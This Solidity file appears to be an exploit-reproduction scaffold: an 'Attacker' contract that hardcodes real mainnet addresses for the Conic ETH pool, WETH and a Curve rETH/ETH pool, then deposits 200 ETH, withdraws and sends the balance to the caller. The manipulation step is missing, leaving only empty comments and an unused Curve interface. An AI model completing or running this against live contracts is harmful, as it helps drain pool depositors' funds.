// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "hardhat/console.sol";

interface ICurve {
    function add_liquidity(
        uint256[2] calldata amounts,
        uint256 min_mint_amount,
        bool use_eth
    ) external payable returns (uint256);

    function remove_liquidity(
        uint256 _amount,
        uint256[2] calldata min_amounts,
        bool use_eth
    ) external;

    function remove_liquidity_one_coin(
        uint256 token_amount,
        uint256 i,
        uint256 min_amount,
        bool use_eth
    ) external returns (uint256);

    function exchange(
        uint256 i,
        uint256 j,
        uint256 dx,
        uint256 min_dy,
        bool use_eth
    ) external payable returns (uint256);
}

interface IConicEthPool {
    function deposit(uint256 underlyingAmount,uint256 minLpReceived) external returns (uint256);
    function deposit(uint256 underlyingAmount,uint256 minLpReceived,bool stake) external returns (uint256);
    function withdraw(uint256 conicLpAmount,uint256 minUnderlyingReceived) external returns (uint256);
}

interface IERC20 {
    function balanceOf(address owner)external view returns(uint256);
    function approve(address spender, uint256 amount)external;
}

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
    function withdraw(uint) external; 
    function approve(address guy, uint wad) external returns (bool);
}

contract Attacker {
    address public conicEthPool = address(0xBb787d6243a8D450659E09ea6fD82F1C859691e9);
    address public conicEthPoolLp = address(0x3565A68666FD3A6361F06f84637E805b727b4A47);
    address public weth = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address public curveRETH_ETH = address(0x0f3159811670c117c372428D4E69AC32325e4D0F);

    constructor() {
        IWETH(weth).approve(conicEthPool, type(uint256).max);
    }

    function execution() public payable {
        uint256 ethBalance = address(this).balance;
        console.log("eth balance: %s", ethBalance);

        try IWETH(weth).deposit{value: 200 ether}() {
            console.log("weth deposit successful");
        } catch Error(string memory reason) {
            console.log("weth deposit error: %s", reason);
        } catch (bytes memory reason) {
            console.log("weth deposit error: %s", string(reason));
        }

        try IConicEthPool(conicEthPool).deposit(200 ether, 0, false) returns (uint256 amount) {
            console.log("conic eth pool deposit successful, amount: %s", amount);
        } catch Error(string memory reason) {
            console.log("conic eth pool deposit error: %s", reason);
        } catch (bytes memory reason) {
            console.log("conic eth pool deposit error: %s", string(reason));
        }

        //

        //
        uint256 lpAmount = IERC20(conicEthPoolLp).balanceOf(address(this));
        console.log("lp amount: %s", lpAmount);

        //
        try IConicEthPool(conicEthPool).withdraw(lpAmount, 0) returns (uint256 amount) {
            console.log("conic eth pool withdraw successful, amount: %s", amount);
        } catch Error(string memory reason) {
            console.log("conic eth pool withdraw error: %s", reason);
        } catch (bytes memory reason) {
            console.log("conic eth pool withdraw error: %s", string(reason));
        }

        //
        try IWETH(weth).withdraw(IERC20(weth).balanceOf(address(this))) {
            console.log("weth withdraw successful");
        } catch Error(string memory reason) {
            console.log("weth withdraw error: %s", reason);
        } catch (bytes memory reason) {
            console.log("weth withdraw error: %s", string(reason));
        }
        //
        (bool success, ) = payable(msg.sender).call{value: address(this).balance}("");
    }

    receive() external payable {}

    fallback(bytes calldata data) external payable returns (bytes memory) {}
}
